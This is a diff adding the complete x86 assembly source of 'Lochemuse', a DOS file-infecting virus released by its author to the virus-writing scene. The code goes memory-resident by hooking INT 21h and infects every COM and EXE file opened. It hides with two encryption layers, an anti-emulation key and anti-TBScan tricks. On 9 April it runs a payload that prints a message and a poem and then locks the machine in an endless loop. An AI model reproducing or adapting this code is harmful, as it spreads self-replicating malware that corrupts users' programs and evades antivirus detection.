@@ -1,0 +1,1089 @@
+;========================================================================;
+;=================== Lochemuse  by LethalMind ===========================;
+;========================================================================;
+;= Features :										=;
+;=	- COM infection									=;
+;=	- EXE infection									=;
+;=	- Residency hooking int 21h							=;
+;=	- A first layer of encryption : simple XOR with an			=;
+;=						  anti-emultaion key.			=;
+;=	- A second layer of encryption : more complicated, but useless	=;
+;=						   anyway (see details below)		=;
+;=												=;
+;=		This virus is actually my very first one, so I guess the	=;
+;=	code could be a lot more compact and powerfull but who cares ?	=;
+;=	The fact that it's my first one will hopefully make it more		=;
+;=	"understandable" to other beginnners. I made this virus after	=;
+;=	one month of viriing, and it was first dubed LM 1.X, but I		=;
+;=	felt like it needed a name before releasing ;). A Lochemuse		=;
+;=	(french word, may be the same in english) is a little worm that	=;
+;=	enters into ant's nest, and, to avoid being eaten, produces a	=;
+;=	drug. The ants can then not live without the Lochemuse and		=;
+;=	defend and feed it (I love this worm ;).					=;
+;=												=;
+;=	Greetings :										=;
+;=		- Ma LOLO : pour toute son aide et son amour...			=;
+;=		- Mist : Part paaaasss !!!						=;
+;=		- Pockets : Thank you for all your precious advices !		=;
+;=		- Darkman : POLYMORPHIC VIRII RULEZ ;)				=;
+;=		- SnakeByte : When do you start residency, huh ?		=;
+;=		- TPhunk : I was not flooding you, just auto-defending	=;
+;=			     myself ;)							=;
+;=		- T00fic : One more that helped me a lot while writing	=;
+;=			     this virus.							=;
+;=		- Fireball : My virus is definately bigger than yours ;)	=;
+;=		- Everybody on #vir and #virus.					=;
+;=												=;
+;=							LethalMind@hotmail.com		=;
+;========================================================================;
+
+
+.model tiny
+.386
+.code
+.radix 10
+	org 100h
+
+start:
+;===================================================================
+;	Start of the code, the first and only 5 bytes of the dropper
+;===================================================================
+
+Dropper	db	0E9h,02h,00h,0cdh,21h
+
+
+
+;===================================================================
+;			Some equations, size of code mainly....
+;===================================================================
+
+; Total size of virus, in bytes
+SizeOfVirus				equ (offset End_Of_Virus - offset Start_Of_Virus)
+
+; Total size of first encrypted part, in word
+FirstEncryptedPartSize		equ (offset EndFirstEncryptedPart - offset FirstEncryptedPart)/2
+
+; Total size of second encrypted part, in word
+SecondEncryptedPartSize		equ (offset EndSecondEncryptedPart - offset SecondEncryptedPart)/2
+
+; Total size of first encryption layer, in word
+FirstLayerSize			equ	(offset End_Of_Virus - offset FirstLayerOfEncryption)/2
+
+
+
+;===================================================================
+;	Virus start here for COM files
+;	The first layer is simply taken off, then it jumps to real
+;	beginning of COM code
+;===================================================================
+
+Start_Of_Virus:
+	mov		bp,0h				; Get Delta Offset in BP (hard coded)
+	push		0f00h				;
+	pop		ax				;
+	int		10h				; Call int 10h,0fh (Get cursor position)
+	xchg		ax,bx				; BX = Cursor position
+	add		bx,	WORD PTR ds:[RandomKey+bp]
+	cmp		[RandomKey+bp],0		; Is it dropper ?
+	jne		Coded				; No, don't 0 key
+	xor		bx,bx				; 0 key for dropper
+
+;Take off first layer of encryption
+Coded:
+	mov		cx,FirstLayerSize		; CX = Number of bytes to decode
+SetSource:
+	mov		si, offset FirstLayerOfEncryption	; Set source and
+	mov		di,si				; destination
+FirstEncryptionLoop:
+	lodsw						; Get a word
+	xor		ax,bx				; Xor it with 5003h key
+	stosw						; Store it
+	loop		FirstEncryptionLoop	; Do this numberofbyte times
+	jmp		Com_Start			; Then go to REAL com code
+
+RandomKey	dw	0				; Encryption key 2
+
+
+;===================================================================
+;	Virus start here for EXE files
+;	Header CS:IP points here.
+;===================================================================
+
+Exe_Entry_Point:
+	mov		bp,0h				; Get Delta Offset in BP (hard coded)
+	push		0f00h				;
+	pop		ax				;
+	int		10h				; Call int 10h,0fh (Get Video State)
+	xchg	ax,bx					; BX = Video State (always 5003h)
+
+;Save registers
+	mov		dx,ds				; DX = DS
+	push		cs				;
+	push		cs				;
+	pop		es				;
+	pop		ds				; ES = DS = CS
+
+	add		bx,	WORD PTR cs:[RandomKey+bp+2]
+
+;Take off first layer of encryption
+	mov		cx,FirstLayerSize		; CX = Number of bytes to decode
+SetSourceexe:
+	mov		si, offset FirstLayerOfEncryption-100h+1	; Set source and
+	mov		di,si				; destination
+FirstEncryptionLoopexe:
+	lodsw						; Get a word
+	xor		ax,bx				; Xor it with 5003h key
+	stosw						; Store it
+	loop	FirstEncryptionLoopexe		; Do this numberofbyte times
+
+
+
+;===================================================================
+;	Real EXE code, beginning of the first encryption layer too
+;===================================================================
+
+FirstLayerOfEncryption:
+Exe_Start:
+	add		bp,2h					; Set BP to delta offset
+
+	push		ss					; Set stack segment to good
+	pop		ax					; value. We incremented it
+	dec		ax					; at infection so it was not
+	cli							; equal to code segment
+	mov		ss,ax					; (Pops a flag in TBScan)
+	sti
+
+	sub		bx,WORD PTR ds:[RandomKey+bp]
+	mov		[Key_5003+bp],bx			; Store 5003h key
+	mov		WORD PTR cs:[Saved_DS+bp],dx	; Store saved DS
+
+
+
+;===================================================================
+;	This uncrypt the second layer, which is divided in two parts
+;	(One for COM code, one for EXE code)
+;===================================================================
+
+	lea		si, [SecondEncryptedPart+bp]	; Decrypt SecondPart
+	mov		di,si					; set source and destination
+	mov		cx,SecondEncryptedPartSize	; set size
+	call		Uncrypt_SecondLayer		; UNCRYPT IT !
+
+SecondEncryptedPart:
+	lea		si, [FirstEncryptedPart+bp]	; Decrypt FirstPart
+	mov		di,si					; set source and destination
+	mov		cx,FirstEncryptedPartSize	; set size
+	call		Uncrypt_SecondLayer		; UNCRYPT IT !
+
+	lea		si,[jmpsave2+bp]			; Set JMP to restore EXE
+	lea		di,[jmpsave+bp]			; at the end of the process.
+	movsw							; copy copy copy
+	movsw							; copy copy copy
+	movsw							; copy copy copy
+	movsw							; copy copy copy =)
+
+
+
+;===================================================================
+;	Heart of the virus : GO RESIDENT !!!
+;===================================================================
+
+	call		GoResident
+
+
+
+;===================================================================
+;	Restore EXE, EXE registers, and give it control.
+;===================================================================
+
+Restore_Exe:
+	mov		dx,WORD PTR cs:[Saved_DS+bp]	; DX = Saved DS				
+	push		dx					;
+	push		dx					;
+	pop		ds					;
+	pop		es					; ES = DS = Saved DS
+
+	mov		bx,ds					; BX = PSP segment
+	add		bx,10h				; Adjust for PSP
+
+	add		word ptr cs:[jmpsave+bp+2],bx		; Relocate jump CS
+	add		bx,word ptr cs:[stacksave+bp+2]	; Relocate stack seg. and -> BX
+	cli
+	mov		sp,word ptr cs:[stacksave+bp]		; Set SP to EXE's SP
+	mov		ss,bx						; Set SS to EXE's SS + relocation
+	sti
+
+	db		0eah					; JUMP CS:IP
+
+;===================================================================
+;	END OF EXE CODE
+;===================================================================
+
+jmpsave	dd		?				; Original CS:IP
+stacksave	dd		?				; Original SS:SP
+jmpsave2	dd		?				; Saved CS:IP
+stacksave2	dd		?				; Saved SS:SP
+EndSecondEncryptedPart:
+
+
+
+;===================================================================
+;	Beginning of COM real code. This begins by decrypting
+;	second layer of encryption.
+;===================================================================
+
+Com_Start:
+	sub		bx,	WORD PTR ds:[RandomKey+bp]
+	mov		[Key_5003+bp],bx			; Save our precious 5003h key
+	mov		WORD PTR cs:[Saved_DS+bp],dx	; Store saved DS
+	cmp		BYTE PTR cs:[FirstEncryptedPart+bp],8dh	; if it's the original file,
+	je		Dont_Decode				; don't decode it
+
+;===================================================================
+;	This uncrypt the second layer, which is divided in two parts
+;	(One for COM code, one for EXE code)
+;===================================================================
+
+
+	lea		si, [FirstEncryptedPart+bp]	; Decrypt FirstPart
+	mov		di,si					; set source and destination
+	mov		cx,FirstEncryptedPartSize	; set size
+	call		Uncrypt_SecondLayer		; UNCRYPT IT !
+
+FirstEncryptedPart:
+	lea		si, [SecondEncryptedPart+bp]	; Decrypt FirstPart
+	mov		di,si					; set source and destination
+	mov		cx,SecondEncryptedPartSize	; set size
+	call		Uncrypt_SecondLayer		; UNCRYPT IT !
+
+Dont_Decode:
+	mov		cx,3
+	lea		si, [FirstBytes+bp]
+	lea		di, [SavedFirstBytes+bp]
+	rep		movsb					; Save original COM adress
+
+
+
+;===================================================================
+;	Heart of the virus : GO RESIDENT !!!
+;===================================================================
+
+	call		GoResident
+
+
+
+;===================================================================
+;	Restore the COM file by copying 3 first bytes back
+;===================================================================
+
+Restore_Com:
+	mov		di,101h				; To 101h
+	dec		di					;   -001h
+	push		di					;   =100h (avoid TBScan)
+	push		di					; Push it one more time to ret to 100h
+	lea		si,[bp+SavedFirstBytes]		; Get first bytes
+	pop		di					; DI = 100h
+	movsw							; Copy
+	movsb							;
+
+	ret							; RET to 100h (beginning of old COM)
+
+;===================================================================
+;	END OF COM CODE
+;===================================================================
+
+
+;===================================================================
+;===================================================================
+;===================================================================
+; This is the main piece of code. It includes a lot of routines :
+;
+;	@GoResident :
+;		Get the virus a nice place to sit in memory
+;		and copy it there before hooking INT 21h.
+;
+;	@Int21NewHandler:
+;		This is where all calls to INT 21h get redirected.
+;
+;	@Int21_Close:
+;		Handle close function of INT 21h (3eh). Infect any COM or
+;		EXE file.
+;
+;	@Try_Infect_COM:
+;	@Infect_COM:
+;	@Try_Infect_EXE:
+;	@Infect_EXE:
+;		"Try" determines if the COM is good to be infected.
+;		Infect actually infects it.
+;
+;	And some other small explicit routines too.
+;===================================================================
+;===================================================================
+;===================================================================
+
+
+
+
+;===================================================================
+;	Heart of the virus : Actually get a chunk of memory and install
+;	the virus in it by copying it and hooking INT 21h. 
+;===================================================================
+
+GoResident:
+	push		es					; Save segment registers
+	push		ds					;
+
+	mov		ax,WORD PTR cs:[Saved_DS+bp]
+	push		ax
+	pop		ds
+
+	mov		ax,0CAFEh				; Detect if already in memory
+	int		21h					;
+	cmp		ax,0FADEh				;
+	jz		Resident_Error			; Yeah, it is, don't reinstall
+
+	mov		ax,3521h				; Get old INT 21h adress
+	int		21h					;
+	mov		cs:[bp+word ptr oldint21+2],es	; Save segment to oldint21
+	mov		cs:[bp+word ptr oldint21],bx		; Save IP to oldint21
+
+	mov		ax,ds					; AX = DS
+	dec		ax					; AX = 1st MCB of chain
+	mov		es,ax					; ES = AX
+
+	mov		ax,es:[3]				; Get MCB size
+	sub		ax,2*(SizeOfVirus+15)/16+1	; substract needed memory in par.
+	xchg		bx,ax					; BX = requested memory
+	push		ds
+
+	pop		es					; ES = DS
+	mov		ah,4ah				; dealocate memory
+	int		21h
+
+	mov		ah,48h				; allocate new size
+	mov		bx,2*(SizeOfVirus+15)/16	;
+	int		21h					;
+	jc		Resident_Error			; If not enough memory, exit
+
+	push		ax					; AX hold segment in memory
+	dec		ax					; AX = MCB of virus
+	mov		es,ax					; ES = AX
+	mov		word ptr es:[1],8			; Mark it as if DOS owned this block
+
+	pop		ax					; Get segment in memory
+	mov		es,ax					; Set everything to
+	xor		di,di					; copy the virus from
+	mov		ax,cs					; file to memory
+	mov		ds,ax					;
+	lea		si,cs:[bp+offset Start_Of_Virus]
+	mov		cx,SizeOfVirus			;
+	rep		movsb					; Copy the virus to memory
+
+	mov		ax,es					; Restore everything
+	mov		ds,ax					;
+
+	mov		ax,2521h				;
+	mov		dx,(offset Int21NewHandler - 105h)
+	int		21h					; Hook int 21h toward new handler
+
+Resident_Error:
+	pop		ds					; Restore saved segments registers
+	pop		es					;
+
+	ret							; Exit
+
+
+
+;===================================================================
+;	This handler will be executed each time INT 21h is called
+;	It will infect any file opened by calling the appropriate
+;	routine.
+;===================================================================
+
+Int21NewHandler:
+	pushf							; Save flags
+	pusha							; Save all registers
+
+	cmp		ax,0CAFEh				; Is it a check ?
+	jnz		No_Check				; No, continue
+
+	popa							; Else restore registers...
+	popf							; ... restore flags...
+	mov		ax,0FADEh				; ... aknowledge the check ...
+	iret							; ... and return
+
+No_Check:
+	cmp		ah,3dh				; Is it a call for open file ?
+	je		Int21_Open				; Yes, GREAT - INFECT =)
+
+
+Int21End:
+	popa							; Restore registers
+	popf							; Restore flags
+
+	db	0eah						; Jump to oldint21
+
+oldint21 dd ?						; This is where real INT 21's adress
+								; is stored
+
+
+
+;===================================================================
+;	This is the executed when a file is opened.
+;	It will check either it's an EXE or a COM file,
+;	and infect it.
+;===================================================================
+
+
+Int21_Open:
+
+	pusha						;save registers
+	mov		ah,2ah			;gets system date
+	pushf
+	call      dword ptr cs:[oldint21-105h]
+	cmp		dx,0409			; Is it 9 april ?				
+	jne		nopay				; no, no payload - yet >:)
+	popa
+
+	push		cs				;
+	pop		ds				; DS = CS
+	push		cs				;
+	pop		es				; ES = CS
+
+	call	PAYLOAD				; PAYBACK TIME :)
+nopay:
+	popa						; restore registers
+
+	push		ds				; Save segments
+	push		es				; registers
+	
+	mov		ax,4300h			; Save attributes
+	int     	21h
+	mov		WORD PTR cs:[f_attr-105h],cx
+
+	mov		si,dx
+
+finddot:
+	inc		si
+	cmp		BYTE PTR ds:[si],'.'	; Find dot in name
+	jne		finddot
+	inc		si
+
+	cmp		WORD PTR ds:[si],'OC'	; Look if it is a COM file
+	jne		NoCOM
+	cmp		BYTE PTR ds:[si+2],'M'
+	jne		NoCOM
+	jmp		fileok
+
+NoCOM:
+	cmp		WORD PTR ds:[si],'XE'	; Look if it is an EXE file
+	jne		End_Int21_OpenErr
+	cmp		BYTE PTR ds:[si+2],'E'
+	jne		End_Int21_OpenErr
+
+fileok:
+	mov     	ax,4301h
+	xor     	cx,cx				;Set attributes to zero
+	int     	21h				;to insure write access.
+
+	mov		ax,3d02h			; Open file R/W
+	pushf
+	call		dword ptr cs:[oldint21-105h]
+	jc		End_Int21_OpenErr		; Something waird occured, better stop
+	xchg		ax,bx
+
+	mov		ax,5700h			;get files time/date stamp
+	Int		21h
+	push		dx				;save the values
+	push		cx				;in dx and cx
+
+	push		cs				;
+	pop		ds				; DS = CS
+	push		cs				;
+	pop		es				; ES = CS
+	
+
+	mov		ax,4200h			; Move file pointer
+	cwd						; at beginning of
+	xor		cx,cx				; file
+	Int		21h
+
+	mov		cx,3				; copy 3 bytes
+	lea		dx,[FirstBytes-105h]	; read to FirstBytes
+	mov		ah,3Fh			; read first 3 bytes
+	Int		21h
+
+	cmp		WORD PTR cs:[FirstBytes-105h],5A4Dh	; Does the file begin with "MZ"
+	jz		Its_An_ExeOpen				; Yes ? It's an EXE -> Infect
+	cmp		WORD PTR cs:[FirstBytes-105h],4D5Ah	; Does the file begin with "ZM"
+	jz		Its_An_ExeOpen				; Yes ? It's an EXE -> Infect
+	call		Try_Infect_COM				; Else it's a COM -> Infect
+
+	jmp		End_Int21_Open		; Ok, return to old handler
+							; and close file
+Its_An_ExeOpen:
+	call	Try_Infect_EXE			; Infect the EXE
+
+End_Int21_Open:
+	pop		cx				; Restore date/time
+	pop		dx				;
+	mov		ax,5701h			;
+	Int		21h				; Do it
+
+	mov		ah,3eh			; Close file
+	Int		21h				;
+
+End_Int21_OpenErr:
+	mov		ax,4301h			; Restore attribs
+	mov		cx,WORD PTR cs:[f_attr-105h]
+	int		21h
+
+	pop		es				; Restore segments
+	pop		ds				; resgisters
+
+
+	jmp		Int21End			; Go back to oldint21
+
+
+
+
+;===================================================================
+;	This check if the .com file is not already infected, and
+;	call Infect_COM if it is not.
+;===================================================================
+
+Try_Infect_COM:
+	mov		ax,4202h			; Move file pointer to
+	mov		dx,-4				; end of file
+	mov		cx,-1				;
+	Int 21h					; call oldint21
+
+	lea		dx,[SavedEndBytes-105h] ; Read two bytes
+	mov		cx,2				;
+	mov		ah,3fh			;
+	Int		21h				; call oldint21
+
+	cmp		WORD PTR ds:[SavedEndBytes-105h],'SN'	; Is it a 'EUNUNS'
+	je		COM_Error
+
+	mov		ax,4202h			; Move file pointer to
+	cwd						; end of file
+	xor		cx,cx				;
+	Int		21h				; call oldint21
+
+	or		dx,dx				; Is file too big ?
+	jnz		COM_Error			; Yes ? Don't infect
+
+
+	cmp		BYTE PTR ds:[FirstBytes-105h],0E9h	; Does the file begin with a jump ?
+	jne		GoInfect_COM		; No, we can infect safely
+
+	sub		ax,SizeOfVirus+3		; Calculate jump adress
+	cmp		ax,WORD PTR ds:[FirstBytes+1-105h]	; Is the file infected ?
+	je		COM_Error			; Yeah, don't infect
+
+	cmp		WORD PTR ds:[FirstBytes+1-105h],02h	; Is it dropper ?
+	je		COM_Error			; Don't infect.
+
+	add		ax,SizeOfVirus		; Restore old size
+
+GoInfect_COM:
+	call	Infect_COM				; Ok, INFECT :]
+
+COM_Error:
+	ret						; Quit
+
+
+
+;===================================================================
+;	This check if the .exe file is not already infected, and
+;	call Infect_EXE if it is not.
+;===================================================================
+
+Try_Infect_EXE:
+	mov		ax,4200h
+	cwd
+	xor		cx,cx
+	Int		21h
+
+	mov		ah,3fh			; Read file to buffer
+	lea		dx,ds:[ExeHeader-105h]	; @ DS:DX
+	mov		cx,1ch			; 1Ah bytes
+	Int		21h
+	jc		EXE_Error
+
+	mov		ax,word ptr ds:[ExeHeader+12h-105h]	; get checksum
+	cmp		word ptr ds:[ExeHeader+04h-105h],ax	; compare checksum with size in page
+	je		EXE_Error
+
+	cmp		word ptr ds:[ExeHeader+1ah-105h],0	; Is this file an overlay ?
+	jne		EXE_Error
+
+	call	Infect_EXE
+EXE_Error:
+	ret
+
+
+
+;===================================================================
+;	This infect a COM file by appending the virus, changing
+;	three first bytes, and hardcoding Delta Offset.
+;===================================================================
+
+Infect_COM:
+	push		ax ax
+	call		rand_16
+	mov		ds:[RandomKey-105h],ax		; Get a random key
+	
+	mov		ax,4200h
+	cwd
+	xor		cx,cx
+	Int		21h
+
+	pop		cx					; get size of file + virsize
+	pop		si					; si=cx
+	push		si
+	sub		si,3					; si = Delta Offset
+	mov		BYTE PTR ds:[BeginHhost3-105h],0e9h	; Write the jmp
+	mov		WORD PTR ds:[BeginHhost3+1-105h],si	; jmp offset
+
+	pop		si					;
+	push		si					;
+	mov		cx,3					; 3 bytes
+	lea		dx,ds:[BeginHhost3-105h]	; Write from the modified beginning
+	push		4000h					;
+	pop		ax					;
+	Int		21h					; Write the jump
+
+	mov		ax,4200h				;
+	xor		cx,cx					;
+	xchg		dx,si					;
+	Int		21h					;
+
+	mov		cx,SizeOfVirus/2+1		; Copy virus at the end
+	lea		si, cs:[Start_Of_Virus-105h]	; so we can modify the code
+	lea		di, cs:[End_Of_Stack-105h]	; before writing
+	rep		movsw					;
+
+	pop		si					;
+	sub		si,5					; get Delta Offset
+	lea		di, ds:[End_Of_Stack-105h]	;
+	push		di					;
+
+	add		di, offset Start_Of_Virus - 104h	; Patch DO
+	mov		WORD PTR cs:[di],si		;
+
+	pop		di
+	add		di, offset SetSource - 104h	;
+	lea		si,ds:[si+FirstLayerOfEncryption]	; Patch DO
+	mov		WORD PTR ds:[di],si		;
+
+	call		Crypt_And_Write			; Crypt n' Write
+
+	ret
+    
+
+
+;===================================================================
+;	This infect an EXE file by appending the virus, changing
+;	the header, and hardcoding Delta Offset.
+;===================================================================
+
+Infect_EXE:
+	les		ax,dword ptr ds:[ExeHeader+14h-105h]	; Get old CS:IP
+	mov		word ptr cs:[jmpsave2-105h], ax		; save it
+	mov		word ptr cs:[jmpsave2+2-105h], es		;
+
+	
+	les		ax,dword ptr ds:[ExeHeader+0Eh-105h]	; Get old SS:SP
+	mov		word ptr cs:[stacksave2-105h], es		; Save it
+	mov		word ptr cs:[stacksave2+2-105h], ax		;
+
+	mov		ax,4202h				; Go to end of file
+	cwd							;
+	xor		cx,cx					;
+	Int		21h					;
+
+	push		bx					; Save some regs
+	push		ax					;
+	push		dx					;
+
+	mov		bx, word ptr cs:[ExeHeader + 8 -105h]	; Get header size
+	mov		cl, 4					; convert to bytes
+	shl		bx, cl				;
+
+	sub		ax, bx 				; Subtract header size from
+	sbb		dx, 0					; file size
+
+	mov		cx, 10h				; Convert to segment:offset
+	div		cx					; form
+ 
+	sub		dx,105h				; Calculate new delta offset
+	mov		WORD PTR ds:[NewDelta-105h],dx ; Save it
+	
+	add		dx,offset Exe_Entry_Point	; Calculate new entry point
+	mov		word ptr ds:[ExeHeader+14h-105h], dx ; Write it to header
+	mov		word ptr ds:[ExeHeader+16h-105h], ax ;
+
+	inc		ax					; increment SS so SS <> CS
+	mov		word ptr ds:[ExeHeader+0Eh-105h], ax ; write to header
+	mov		word ptr ds:[ExeHeader+10h-105h], offset End_Of_Stack - 105h
+	
+	pop		dx				; Restore some regs
+	pop		ax				;
+	pop		bx				;
+
+	add		ax, SizeOfVirus		; add virus size
+	adc		dx, 0
+
+	push		ax				; Save low word of filesize
+	mov		cl, 9				; 2^9 = 512
+	shr		ax, cl			; / 512
+	ror		dx, cl			; / 512 (sort of)
+	stc
+
+	adc		dx, ax			; of 1 to the DIV 512 portion
+	pop		ax				; Restore low word of filesize
+	and		ah, 1				; MOD 512
+
+
+	
+	mov		word ptr ds:[ExeHeader+4-105h], dx		; new file size
+	mov		word ptr ds:[ExeHeader+12h-105h], dx	; checksum
+	mov		word ptr ds:[ExeHeader+2-105h], ax		; new file page
+
+	push		cs				; restore ES
+	pop		es
+
+	mov		ax,4200h			; Move file pointer
+	xor		cx,cx				; to beginning of file
+	cwd						; xor dx,dx
+	Int		21h
+
+	mov		cx, 1ch
+	push		4000h
+	pop		ax
+	lea		dx,ds:[ExeHeader-105h]	; Write header from buffer
+	Int		21h
+
+	mov		ax,4202h			; Move file pointer
+	xor		cx,cx				; to end of file
+	cwd						; xor dx,dx
+	Int		21h
+	push		ax
+
+	call		rand_16
+	mov		ds:[RandomKey-105h],ax	; get a random key
+
+	mov		cx,SizeOfVirus/2+1
+	lea		si, ds:[Start_Of_Virus-105h]
+	lea		di, ds:[End_Of_Stack-105h]
+	rep		movsw				; Copy virus to memory so
+							; we can do what we want
+	
+	pop		si				; Get size
+	sub		si,5				; Get futur DO
+
+	lea		di, ds:[End_Of_Stack-105h]
+	push		di
+	add		di, offset Start_Of_Virus - 104h	; Patch StartOfVirus in memory
+	mov		WORD PTR ds:[di],si	; With DO
+
+
+	pop		di
+	push		di
+	add		di,offset SetSourceexe - 104h		; Patch SetSource in memory
+	mov		ax,offset FirstLayerOfEncryption	; With adress of FirstLayer in memory
+	add		ax,WORD PTR ds:[NewDelta-105h]
+	mov		WORD PTR ds:[di],ax
+
+	pop		di
+	add		di, offset Exe_Entry_Point- 104h	; Patch EXE entry point
+	mov		dx,WORD PTR ds:[NewDelta-105h]
+	sub		dx,2
+	mov		WORD PTR ds:[di],dx			; With DO - 2
+	add		dx,2
+	add		di, offset BeginHhost3-Exe_Entry_Point
+	mov		WORD PTR ds:[di],dx
+	mov		WORD PTR ds:[BeginHhost3+1-105h],dx
+
+	call		Crypt_And_Write	; Crypt n' Write
+
+	ret
+
+
+
+;===================================================================
+;	This routine take care of crypting and writing to disk the
+;	virus' image in memory. The encryption is separated in two
+;	layers, and the inside layer is separated in two parts (WOW ;)	
+;===================================================================
+
+Crypt_And_Write:
+	lea		si, ds:[End_Of_Stack-105h]	; Fill parameter for CRYPT routine
+	mov		dx,si					;
+	add		si, offset FirstEncryptedPart - 105h
+	mov		di,si					;
+	push		SizeOfVirus				; Save SizeOFVirus
+	push		dx					; Save EndOfStack
+	mov		cx,FirstEncryptedPartSize	;
+	push		dx					; Save EndOfStack
+
+	call		CRYPT					; CRYPT First part of second layer
+
+	pop		si					; Get EndOfStack
+	push		si					; Save it again
+	add		si, offset SecondEncryptedPart - 105h	; Set it to second part
+	mov		di,si					;
+	mov		cx,SecondEncryptedPartSize	;
+
+	call		CRYPT					; CRYPT Second part of second layer
+
+	mov		cx,FirstLayerSize			; Set regs for FirstEncryption
+	pop		si					; Get EndOfStack
+	add		si,offset FirstLayerOfEncryption - 105h	; Set si to beginning
+	mov		di,si					;
+
+	call		FirstEncryptionLoop2		; Encrypt first layer
+
+; Now the image in memory is ready, we just need to copy it
+; To the file.
+
+
+	pop		dx					; Get back EndOfStack
+	pop		cx					; Get back SizeOfVirus
+	push		ds:[Key_5003-105h]		; Save our precious key
+	mov		ds:[Key_5003-105h],0		; ZERO it
+	push		4000h					;
+	pop		ax					;
+	Int		21h					; Write to file
+	pop		ds:[Key_5003-105h]		; Restore our key
+	ret							; THE END ;)
+
+
+;===================================================================
+;	This routine uses several simple encryption for the second
+;	layer.
+;===================================================================
+
+CRYPT:
+CRYPT_LOOP:
+	lodsw							; Get a word
+	not		ax					; Perform several encryption
+	rol		ax,2					;
+	sub		ax,5003h				;
+	xor		ax,WORD PTR ds:[RandomKey-105h]	; XOR with random key
+	stosw							; Store modified word
+	loop		CRYPT_LOOP				; loop it
+	ret
+
+
+
+;===================================================================
+;	This routine uses a simple XOR to encrypt the first layer
+;	No AVs can penetrate this layer only because of the magic
+;	key. =)
+;===================================================================
+
+FirstEncryptionLoop2:
+	push		bx			; Save handle to file !!
+	mov		bx,WORD PTR ds:[RandomKey-105h] 
+	add		bx, 5003h		; BX = RandomKey + 5003h_Key
+RealLoop:
+	lodsw					; Get a word
+	xor		ax,bx			; XOR it with key
+	stosw					; Store it
+	loop		RealLoop		; Loop it
+	pop		bx			; Retore handle to file !!
+	ret
+
+
+
+;===================================================================
+;	Payload :
+;		It will, on 9th April, display "Lochemuse is... ALIVE"
+;	in the center of the screen, but it will type it, that is,
+;	display it letter by letter with random intervalls between
+;	each. Then it will wait 5 seconds and display a little poem :]
+;===================================================================
+
+PAYLOAD:
+	mov		ax,0003h	; Set video-mode 80*25 16-Colors
+	int		10h
+
+	mov		[Dislexia-105h],1		; This switch make the
+							; letters appear 1 by 1
+	lea		si,[Message-105h]		;
+	mov		cx,24d			; Print 24 letters
+	call		printstring			; DO IT
+
+	mov		ax,500h			; Wait 5 seconds
+	mov		[Randomtimer-105h],ax	;
+	mov		ah,2ch			; call time
+	Int		21h				;
+	mov		[Savedtimer-105h],dx	; Put saved time here
+timerloop2:
+	Int		21h
+	sub		dx,[Savedtimer-105h]
+	cmp		dx,[Randomtimer-105h]	; If delay < at 5 seconds
+	jbe		timerloop2			; Loop
+
+	mov		[Dislexia-105h],0		; No more dislexia ;)
+
+	lea		si,[Poeme1-105h]		; This time print poem
+	mov		cx,0eh			; Print 0eh lines
+Printline:
+	push		cx				;
+	call		printstring			; Print a line
+	pop		cx				;
+	loop		Printline			;
+	
+
+enprog:
+	jmp		enprog			; The payload ends on
+							; a nice infinite loop :)
+
+printstring:
+	mov		ah,02h			; Set cursor position
+	xor		bh,bh				;
+	mov		dx,WORD PTR [si]		; To posistion indicated by string
+	int		10h				; Do it
+	xor		cx,cx				;
+	mov		cl,BYTE PTR [si+2]	; Number of characters -> CX
+	add		si,3				; Jmp over number of character and line...
+loopstr:
+	push		cx
+	lodsb						; Get a character
+	
+	mov		ah,09h			; Print character
+	mov		bx,0004h			;
+	mov		cx,0001h			;
+	int		10h				; Print al
+
+	mov		ah,03h			; Read cursor position
+	int		10h				; 
+
+	mov		ah,02h			; Set cursor position
+	inc		dl				; To next character
+	int		10h				;
+
+	cmp		[dislexia-105h],0		; Are we dislexic ?
+	je		nolag				; No, jump over the timer
+
+	mov		ax,0a0h			; Else wait between 0 and a0h milliseconds
+	call		rand_in_range		;
+	mov		[Randomtimer-105h],ax	;
+	mov		ah,2ch			;
+	Int		21h				;
+	mov		[Savedtimer-105h],dx	;
+timerloop:
+	Int		21h				;
+	sub		dx,[Savedtimer-105h]	;
+	cmp		dx,[Randomtimer-105h]	;
+	jbe		timerloop			; (See same routine up there for commmentary)
+
+nolag:
+	pop		cx
+	loop		loopstr			; loop it for each character
+
+	ret
+
+
+
+;===================================================================
+; Random routines originated by rincewhind. These sucks, but they
+; are by far sufficient for needed purpose. They are quite
+; self-explanatory so I won't include any comments.
+;===================================================================
+
+rand_in_range:
+	xchg		ax,bx
+	call		get_rnd
+ 	xor		dx,dx
+	div		bx
+	xchg		ax,dx  ;dx=remainder
+	ret
+
+get_rnd:
+	in		ax,40h
+	xor		ax, 0FFFFh
+	org		$-2
+ 	Randomize	dw ?
+	mov		[Randomize-105h],ax
+	ret
+
+
+rand_16:
+	in		ax,40h	; Get timer
+	mov		cl,al
+	in		ax,40h	; Get timer
+	mov		ah,cl
+	ret
+
+FirstBytes	db	0B8h,00h,4ch	; Code of fake host (Quit)
+
+; Used for payload
+Savedtimer	dw	?
+Randomtimer	dw	?
+Dislexia	db	?
+Message	db	18h,0bh,24d,'Lochemuse is.... ALIVE !'
+Poeme1 db 04d,06d,73d,'Je ne veux pas te perdre. Plus jamais je n''eprouverais un sentiment aussi'
+db 18d,07d,42d,'fort pour quelqu''un ou pour quelque chose.'
+db 16d,08d,48d,'Ce n''etait pas prevu, ma connexion ame avec toi.'
+db 28d,09d,25d,'Tu m''as vole ma solitude.'
+db 01d,10d,78d,'Personne ne le sait mais j''attendais ca, que toi, ma voleuse, tu t''introduises'
+db 02d,11d,76d,'dans mon autonomie, j''avais ferme a cle et laisse les fenetres ouvertes dans'
+db 24d,12d,32d,'l''espoir, mais sans y croire que'
+db 36d,14d,8d,'========'
+db 36d,15d,8d,'== TU =='
+db 36d,16d,8d,'========'
+db 35d,18d,10d,'viendrais.'
+db 60d,20d,9d,'A ma LOLO'
+EndFirstEncryptedPart:
+
+
+
+;===================================================================
+; This routine encrypt the second layer of encryption.. Nothing
+; fancy here....
+;===================================================================
+
+Uncrypt_SecondLayer:
+	mov		ax,WORD PTR cs:[Key_5003+bp]		; Use 5003h key to
+	mov		WORD PTR cs:[ADDING+1+bp],ax		; Patch the code on runtime
+
+	mov		bx,WORD PTR ds:[RandomKey+bp]		; BX = RandomKey
+Uncrypt_SecondLayer_Loop:
+	lodsw							; Get a word
+	xor		ax,bx					;
+ADDING:							;
+	add		ax,50h				; Perform encryption
+	ror		ax,2					;
+	not		ax					;
+	stosw							; Store it
+	loop		Uncrypt_SecondLayer_Loop	; Loop it
+	mov		WORD PTR ds:[ADDING+1+bp],ax	; Repatch it, so next copy won't be
+								; already patched
+
+	ret
+
+
